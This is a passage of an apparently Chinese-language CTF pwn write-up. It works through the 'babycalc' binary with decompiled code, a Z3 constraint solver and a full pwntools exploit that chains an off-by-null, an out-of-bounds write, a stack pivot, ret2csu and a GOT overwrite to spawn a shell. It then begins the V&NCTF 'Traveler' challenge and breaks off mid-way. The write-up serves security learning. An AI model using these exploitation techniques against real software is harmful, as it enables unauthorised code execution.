,R12指向目标函数, 填充三个参数(逆序):RDX, RSI , RDI</span><br>csu(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, write_got, <span class="hljs-number">8</span>, write_got, <span class="hljs-number">1</span>, main_addr)<br></code></pre></td></tr></table></figure><p>本题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs assembly">csu_one_addr    =  0x400C96<br>csu_second_addr =  0x400C80<br>def csu(rdi,rsi,rdx,call_addr):<br># pop rbx,rbp,r12,r13,r14,r15<br>    # rbx = 0,<br>    # rbp = 1, not to jump<br>    # r12 = 目标函数地址<br>    # r13 = rdx<br>    # r14 = rsi<br>    # r15d = edi = rdi<br>    payload =  p64(csu_one_addr)+ p64(0)+ p64(1)+ p64(call_addr)+ p64(rdx)+ p64(rsi)+ p64(rdi)<br>    payload += p64(csu_second_addr)<br>    payload += p64(0)*7<br>    return payload<br><br></code></pre></td></tr></table></figure><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p><strong>开了NX保护，栈迁移,ret2csu,ret2libc</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __fastcall <span class="hljs-title function_">vuln</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> v0; <span class="hljs-comment">// al</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">208</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-100h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int8 v2; <span class="hljs-comment">// [rsp+D0h] [rbp-30h]0</span><br>  <span class="hljs-type">unsigned</span> __int8 v3; <span class="hljs-comment">// [rsp+D1h] [rbp-2Fh] 1</span><br>  <span class="hljs-type">unsigned</span> __int8 v4; <span class="hljs-comment">// [rsp+D2h] [rbp-2Eh]2</span><br>  <span class="hljs-type">unsigned</span> __int8 v5; <span class="hljs-comment">// [rsp+D3h] [rbp-2Dh]3</span><br>  <span class="hljs-type">unsigned</span> __int8 v6; <span class="hljs-comment">// [rsp+D4h] [rbp-2Ch]4</span><br>  <span class="hljs-type">unsigned</span> __int8 v7; <span class="hljs-comment">// [rsp+D5h] [rbp-2Bh]5</span><br>  <span class="hljs-type">unsigned</span> __int8 v8; <span class="hljs-comment">// [rsp+D6h] [rbp-2Ah]6</span><br>  <span class="hljs-type">unsigned</span> __int8 v9; <span class="hljs-comment">// [rsp+D7h] [rbp-29h]7</span><br>  <span class="hljs-type">unsigned</span> __int8 v10; <span class="hljs-comment">// [rsp+D8h] [rbp-28h]8</span><br>  <span class="hljs-type">unsigned</span> __int8 v11; <span class="hljs-comment">// [rsp+D9h] [rbp-27h]9</span><br>  <span class="hljs-type">unsigned</span> __int8 v12; <span class="hljs-comment">// [rsp+DAh] [rbp-26h]10</span><br>  <span class="hljs-type">unsigned</span> __int8 v13; <span class="hljs-comment">// [rsp+DBh] [rbp-25h]11</span><br>  <span class="hljs-type">unsigned</span> __int8 v14; <span class="hljs-comment">// [rsp+DCh] [rbp-24h]12</span><br>  <span class="hljs-type">unsigned</span> __int8 v15; <span class="hljs-comment">// [rsp+DDh] [rbp-23h]13</span><br>  <span class="hljs-type">unsigned</span> __int8 v16; <span class="hljs-comment">// [rsp+DEh] [rbp-22h]14</span><br>  <span class="hljs-type">unsigned</span> __int8 v17; <span class="hljs-comment">// [rsp+DFh] [rbp-21h]15</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+FCh] [rbp-4h]</span><br>  <span class="hljs-comment">//[rbp]</span><br>  <span class="hljs-comment">//ret</span><br>    <br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">15</span>; ++i )<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;number-%d:&quot;</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(i + <span class="hljs-number">1</span>));<br>    buf[(<span class="hljs-type">int</span>)read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x100</span>uLL)] = <span class="hljs-number">0</span>;  <span class="hljs-comment">//可以改i的值</span><br>    v0 = strtol(buf, <span class="hljs-number">0LL</span>, <span class="hljs-number">10</span>); <span class="hljs-comment">//调试后发现输入payload，不会变，所以可以布栈</span><br>    *(&amp;v2 + i) = v0;    <span class="hljs-comment">//有问题！！！越界</span><br>  &#125;<br>  <span class="hljs-comment">//b&#x27;\x13&#x27;+ b&#x27;\x24&#x27;+ b&#x27;\x35&#x27;+ b&#x27;\x46&#x27;+ b&#x27;\x37&#x27; + b&#x27;\x42&#x27; + b&#x27;\x11&#x27; + b&#x27;\xA1&#x27; + b&#x27;\x32&#x27; + b&#x27;\x83&#x27; + b&#x27;\xD4&#x27; + b&#x27;\x65&#x27; + b&#x27;\x76&#x27;+ b&#x27;\xC7&#x27;+ b&#x27;\x18&#x27;+ b&#x27;\x03&#x27;</span><br>  <span class="hljs-keyword">if</span> ( v4 * v3 * v2 - v5 != <span class="hljs-number">36182</span><br>    || v2 != <span class="hljs-number">19</span><br>    || v4 * <span class="hljs-number">19</span> * v3 + v5 != <span class="hljs-number">36322</span><br>    || (v12 + v2 - v7) * v15 != <span class="hljs-number">32835</span><br>    || (v3 * v2 - v4) * v5 != <span class="hljs-number">44170</span><br>    || (v4 + v3 * v2) * v5 != <span class="hljs-number">51590</span><br>    || v8 * v7 * v6 - v9 != <span class="hljs-number">61549</span><br>    || v9 * v14 + v3 + v17 != <span class="hljs-number">19037</span><br>    || v8 * v7 * v6 + v9 != <span class="hljs-number">61871</span><br>    || (v7 * v6 - v8) * v9 != <span class="hljs-number">581693</span><br>    || v10 != <span class="hljs-number">50</span><br>    || (v8 + v7 * v6) * v9 != <span class="hljs-number">587167</span><br>    || v12 * v11 * v10 - v13 != <span class="hljs-number">1388499</span><br>    || v12 * v11 * v10 + v13 != <span class="hljs-number">1388701</span><br>    || (v11 * v10 - v12) * v13 != <span class="hljs-number">640138</span><br>    || (v10 * v4 - v15) * v11 != <span class="hljs-number">321081</span><br>    || (v12 + v11 * v10) * v13 != <span class="hljs-number">682962</span><br>    || v16 * v15 * v14 - v17 != <span class="hljs-number">563565</span><br>    || v16 * v15 * v14 + v17 != <span class="hljs-number">563571</span><br>    || v13 != <span class="hljs-number">101</span><br>    || (v15 * v14 - v16) * v17 != <span class="hljs-number">70374</span><br>    || (v16 + v15 * v14) * v17 != <span class="hljs-number">70518</span> )<br>  &#123;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;good done&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p><strong>循环中</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">15</span>; ++i )<br>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;number-%d:&quot;</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(i + <span class="hljs-number">1</span>));<br>  buf[(<span class="hljs-type">int</span>)read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x100</span>uLL)] = <span class="hljs-number">0</span>;  <span class="hljs-comment">//可以改i的值，结合后面，可以实现越界写</span><br>       <span class="hljs-comment">//同时有一个offbynull，相当于只有一个NULL字节的溢出</span><br>  v0 = strtol(buf, <span class="hljs-number">0LL</span>, <span class="hljs-number">10</span>); <span class="hljs-comment">//调试后发现输入payload，不会变，所以可以布栈</span><br>  *(&amp;v2 + i) = v0;    <span class="hljs-comment">//通过控制i，越界写，改ret为leave_ret</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>off-by-null：</strong>栈覆写，控一下程序流</p><p>越界写：开始想通过strtol返回一个地址，实现覆写，但是不行，需要换种思路</p><p>​</p><h4 id="Z3"><a href="#Z3" class="headerlink" title="Z3"></a>Z3</h4><p><strong>可以通过python脚本实现(也可以手算)</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br>s=Solver()<br>v3,v4,v5,v6,v7,v8,v9,v10,v11,v12,v13,v14,v15,v16,v17,v18=Ints(<span class="hljs-string">&#x27;v3 v4 v5 v6 v7 v8 v9 v10 v11 v12 v13 v14 v15 v16 v17 v18&#x27;</span>)<br>s.add(v3==<span class="hljs-number">19</span>)<br>s.add(v5 * v4 * v3 - v6 == <span class="hljs-number">36182</span>)<br>s.add( v5 * <span class="hljs-number">19</span> * v4 + v6 == <span class="hljs-number">36322</span>)<br>s.add( (v13 + v3 - v8) * v16 == <span class="hljs-number">32835</span>)<br>s.add( (v4 * v3 - v5) * v6 == <span class="hljs-number">44170</span>)<br>s.add( (v5 + v4 * v3) * v6 == <span class="hljs-number">51590</span>)<br>s.add( v9 * v8 * v7 - v10 == <span class="hljs-number">61549</span>)<br>s.add( v10 * v15 + v4 + v18 == <span class="hljs-number">19037</span>)<br>s.add( v9 * v8 * v7 + v10 == <span class="hljs-number">61871</span>)<br>s.add( (v8 * v7 - v9) * v10 == <span class="hljs-number">581693</span>)<br>s.add( v11 == <span class="hljs-number">50</span>)<br>s.add( (v9 + v8 * v7) * v10 == <span class="hljs-number">587167</span>)<br>s.add( v13 * v12 * v11 - v14 == <span class="hljs-number">1388499</span>)<br>s.add( v13 * v12 * v11 + v14 == <span class="hljs-number">1388701</span>)<br>s.add( (v12 * v11 - v13) * v14 == <span class="hljs-number">640138</span>)<br>s.add( (v11 * v5 - v16) * v12 == <span class="hljs-number">321081</span>)<br>s.add( (v13 + v12 * v11) * v14 == <span class="hljs-number">682962</span>)<br>s.add( v17 * v16 * v15 - v18 == <span class="hljs-number">563565</span>)<br>s.add( v17 * v16 * v15 + v18 == <span class="hljs-number">563571</span>)<br>s.add( v14 == <span class="hljs-number">101</span>)<br>s.add( (v16 * v15 - v17) * v18 == <span class="hljs-number">70374</span>)<br>s.add( (v17 + v16 * v15) * v18 == <span class="hljs-number">70518</span> )<br><span class="hljs-built_in">print</span>(s.check())<br><span class="hljs-built_in">print</span>(s.model())<br></code></pre></td></tr></table></figure><p><code>v2-v17: 19,36,53,70,55,66,17,161,50,131,212,101,118,199,24,3</code></p><p>翻译为字节：<code>\x13 \x24 \x35 \x46 \x37 \x42 \x11 \xA1 \x32 \x83 \xD4 \x65 \x76 \xC7 \x18 \x03</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">&#123;<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;good done&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><ol><li>off-by-null覆写rbp低位为\x00</li><li>利用越界写，控制ret，改成leave_ret，进行栈迁移回栈（需要爆破1&#x2F;16）</li><li>因为程序不清楚栈，所以提前控制栈帧</li><li>泄露 libc 地址后用 csu 调用 read 函数覆写 got 表</li></ol><h3 id="一步到位exp"><a href="#一步到位exp" class="headerlink" title="一步到位exp"></a>一步到位exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: &lt;encoding name&gt; -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>banary = <span class="hljs-string">&quot;./babycalc&quot;</span><br>elf = ELF(banary)<br>ip = <span class="hljs-string">&#x27;1&#x27;</span><br>port = <span class="hljs-number">1</span><br><br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span>(local==<span class="hljs-number">1</span>):<br>p = process(banary)<br><span class="hljs-keyword">else</span>:<br>p = remote(ip, port)<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>gdb.attach(p)<br>pause()<br><br>s = <span class="hljs-keyword">lambda</span> data : p.send(data)<br>sl = <span class="hljs-keyword">lambda</span> data : p.sendline(data)<br>sa = <span class="hljs-keyword">lambda</span> text, data : p.sendafter(text, data)<br>sla = <span class="hljs-keyword">lambda</span> text, data : p.sendlineafter(text, data)<br>r = <span class="hljs-keyword">lambda</span> : p.recv()<br>ru = <span class="hljs-keyword">lambda</span> text : p.recvuntil(text)<br>uu32 = <span class="hljs-keyword">lambda</span> : u32(p.recvuntil(<span class="hljs-string">b&quot;\xff&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>uu64 = <span class="hljs-keyword">lambda</span> : u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>lg = <span class="hljs-keyword">lambda</span> s : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m %s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br>pi = <span class="hljs-keyword">lambda</span> : p.interactive()<br><br><span class="hljs-comment">#-----------------------1.Gadget  ---------------------------</span><br><span class="hljs-comment">#debug()</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">$ ROPgadget --binary ./babycalc | grep &#x27;leave ; ret&#x27;</span><br><span class="hljs-string">0x0000000000400bb7 : leave ; ret</span><br><span class="hljs-string">0x0000000000400c17 : nop ; leave ; ret</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>rdi_ret = <span class="hljs-number">0x0000000000400ca3</span><br>rsi_r15_ret = <span class="hljs-number">0x0000000000400ca1</span><br>ret = <span class="hljs-number">0x0000000000400ca4</span><br>leave_ret = <span class="hljs-number">0x0000000000400c17</span><br><br>puts_plt = elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>puts_got = elf.got[<span class="hljs-string">&quot;puts&quot;</span>]<br>read_got = elf.got[<span class="hljs-string">&quot;read&quot;</span>]<br><br>csu_one_addr    =  <span class="hljs-number">0x400C96</span><br>csu_second_addr =  <span class="hljs-number">0x400C80</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">csu</span>(<span class="hljs-params">rdi,rsi,rdx,call_addr</span>):<br><span class="hljs-comment"># pop rbx,rbp,r12,r13,r14,r15</span><br>    <span class="hljs-comment"># rbx = 0,</span><br>    <span class="hljs-comment"># rbp = 1, not to jump</span><br>    <span class="hljs-comment"># r12 = call_</span><br>    <span class="hljs-comment"># r13 = rdx</span><br>    <span class="hljs-comment"># r14 = rsi</span><br>    <span class="hljs-comment"># r15d = edi = rdi</span><br>    payload =  p64(csu_one_addr)+ p64(<span class="hljs-number">0</span>)+ p64(<span class="hljs-number">1</span>)+ p64(call_addr)+ p64(rdx)+ p64(rsi)+ p64(rdi)<br>    payload += p64(csu_second_addr)<br>    payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">7</span><br>    <span class="hljs-keyword">return</span> payload<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br><span class="hljs-comment">#-----------------------2.Calc + stack_piviot-----------------------------</span><br>matrix= [<span class="hljs-number">19</span>,<span class="hljs-number">36</span>,<span class="hljs-number">53</span>,<span class="hljs-number">70</span>,<span class="hljs-number">55</span>,<span class="hljs-number">66</span>,<span class="hljs-number">17</span>,<span class="hljs-number">161</span>,<span class="hljs-number">50</span>,<span class="hljs-number">131</span>,<span class="hljs-number">212</span>,<span class="hljs-number">101</span>,<span class="hljs-number">118</span>,<span class="hljs-number">199</span>,<span class="hljs-number">24</span>,<span class="hljs-number">3</span>]<br><span class="hljs-comment">#\x13 \x24 \x35 \x46 \x37 \x42 \x11 \xA1 \x32 \x83 \xD4 \x65 \x76 \xC7 \x18 \x03</span><br><br><span class="hljs-comment">#0x30+0x40+0x38 =0xa8</span><br>ROP =  p64(rdi_ret) + p64(puts_got) +p64(puts_plt) <span class="hljs-comment">#leak_libc</span><br>ROP += csu(<span class="hljs-number">0</span>, puts_got, <span class="hljs-number">0x30</span>, read_got)  <span class="hljs-comment">#read(0, puts_got , 0x30) 改puts_got表地址，同时输入/bin/sh</span><br>ROP += p64(rdi_ret) + p64(puts_got+<span class="hljs-number">8</span>) +p64(puts_plt) <span class="hljs-comment">#puts( &amp;puts_got+8 ) == system(&#x27;/bin/sh\x00&#x27;)</span><br><br>payload =  <span class="hljs-built_in">str</span>(<span class="hljs-number">0x18</span>).encode().ljust(<span class="hljs-number">0x8</span>,<span class="hljs-string">b&#x27;\0&#x27;</span>) <span class="hljs-comment">#0x8</span><br>payload += p64(ret)* <span class="hljs-number">4</span> <span class="hljs-comment">#0x8 - 0x28</span><br>payload += ROP <span class="hljs-comment">#0xD0</span><br>payload += <span class="hljs-string">b&#x27;\x13&#x27;</span>+ <span class="hljs-string">b&#x27;\x24&#x27;</span>+ <span class="hljs-string">b&#x27;\x35&#x27;</span>+ <span class="hljs-string">b&#x27;\x46&#x27;</span>+ <span class="hljs-string">b&#x27;\x37&#x27;</span> + <span class="hljs-string">b&#x27;\x42&#x27;</span> + <span class="hljs-string">b&#x27;\x11&#x27;</span> + <span class="hljs-string">b&#x27;\xA1&#x27;</span> + <span class="hljs-string">b&#x27;\x32&#x27;</span> + <span class="hljs-string">b&#x27;\x83&#x27;</span> + <span class="hljs-string">b&#x27;\xD4&#x27;</span> + <span class="hljs-string">b&#x27;\x65&#x27;</span> + <span class="hljs-string">b&#x27;\x76&#x27;</span>+ <span class="hljs-string">b&#x27;\xC7&#x27;</span>+ <span class="hljs-string">b&#x27;\x18&#x27;</span>+ <span class="hljs-string">b&#x27;\x03&#x27;</span><br>payload = payload.ljust(<span class="hljs-number">0xfc</span>,<span class="hljs-string">b&#x27;\0&#x27;</span>)<br>payload += p32(<span class="hljs-number">0x38</span>)<br><br><span class="hljs-comment">#pause()</span><br>sa(<span class="hljs-string">b&#x27;:&#x27;</span>, payload)<br><span class="hljs-comment">#pause()</span><br><span class="hljs-comment">#--------------------------------3.libc -------------------------------------</span><br>puts_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">0x8</span>,<span class="hljs-string">b&#x27;\0&#x27;</span>))<br>libc_base = puts_addr - libc.sym[<span class="hljs-string">&quot;puts&quot;</span>]<br>system_addr = libc_base + libc.sym[<span class="hljs-string">&quot;system&quot;</span>]<br>lg(<span class="hljs-string">&#x27;puts_addr&#x27;</span>)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>)<br>    <br>sl(p64(system_addr) + <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br><br>pi()<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>  <span class="hljs-comment">#p = remote(&#x27;&#x27;,)</span><br>  p = process(<span class="hljs-string">&#x27;./babycalc&#x27;</span>)<br>  <span class="hljs-keyword">try</span>:<br>      pwn()<br>  excepts:<br>      p.close()<br>      <span class="hljs-keyword">continue</span><br></code></pre></td></tr></table></figure><h2 id="3-JIT"><a href="#3-JIT" class="headerlink" title="3.JIT"></a>3.JIT</h2><h1 id="③V-amp-NCTF"><a href="#③V-amp-NCTF" class="headerlink" title="③V&amp;NCTF"></a>③V&amp;NCTF</h1><h2 id="1-Traveler"><a href="#1-Traveler" class="headerlink" title="1.Traveler"></a>1.Traveler</h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>main</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-20h] BYREF</span><br><br>  init(argc, argv, envp);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;who r u?&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x30</span>uLL);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;How many travels can a person have in his life?&quot;</span>);<br>  read(<span class="hljs-number">0</span>, &amp;msg, <span class="hljs-number">0x28</span>uLL);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>第一步覆盖rbp，ret，进行栈迁移</p><p>第二步，向bss段写，控栈，五条指令</p><p><strong>汇编</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:000000000040120A 48 8D 3D 01 0E 00 00          lea     rdi, s                          ; &quot;who r u?&quot;<br>.text:0000000000401211 E8 5A FE FF FF                call    _puts<br>.text:0000000000401211<br>.text:0000000000401216 48 8D 45 E0                   lea     rax, [rbp+buf]<br>.text:000000000040121A BA 30 00 00 00                mov     edx, 30h ; &#x27;0&#x27;                  ; nbytes<br>.text:000000000040121F 48 89 C6                      mov     rsi, rax                        ; buf<br>.text:0000000000401222 BF 00 00 00 00                mov     edi, 0                          ; fd<br>.text:0000000000401227 E8 74 FE FF FF                call    _read<br>.text:0000000000401227<br>.text:000000000040122C 48 8D 3D ED 0D 00 00          lea     rdi, aHowManyTravels            ; &quot;How many travels can a person have in h&quot;...<br>.text:0000000000401233 E8 38 FE FF FF                call    _puts<br>.text:0000000000401233<br>.text:0000000000401238 BA 28 00 00 00                mov     edx, 28h ; &#x27;(&#x27;                  ; nbytes<br>.text:000000000040123D 48 8D 35 5C 2E 00 00          lea     rsi, msg                        ; buf<br>.text:0000000000401244 BF 00 00 00 00                mov     edi, 0                          ; fd<br>.text:0000000000401249 E8 52 FE FF FF                call    _read<br>.text:0000000000401249<br>.text:000000000040124E B8 00 00 00 00                mov     eax, 0<br>.text:0000000000401253 C9                            leave<br>.text:0000000000401254 C3                            retn<br></code></pre></td></tr></table></figure><p><strong>注意末尾的<code>mov eax,0</code>指令，这一步之后，就不能复用了，所以不能利用这一段的Gadget</strong></p><h4 id="pop-x2F-push-x2F-ret"><a href="#pop-x2F-push-x2F-ret" class="headerlink" title="pop&#x2F;push&#x2F;ret"></a>pop&#x2F;push&#x2F;ret</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs assembly">pop<br>rsp+8<br><br>push<br>rsp-8<br><br>call s<br>push rip<br>jmp s<br><br>leave<br>mov rsp,rbp <br>pop rbp<br><br>ret<br>pop rip<br>jmp xx<br></code></pre></td></tr></table></figure><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p><strong>ret2syscall</strong></p><p><strong>1. 通过栈迁移，控制gadget，实现再次写</strong></p><p><strong>2. 布栈，实现泄露libc，同时控制程序流，返回main</strong></p><p><strong>3. 再次栈迁移，控制gadget，实现再次写</strong></p><p><strong>4. 布栈，控制寄存器，打one_gadget</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 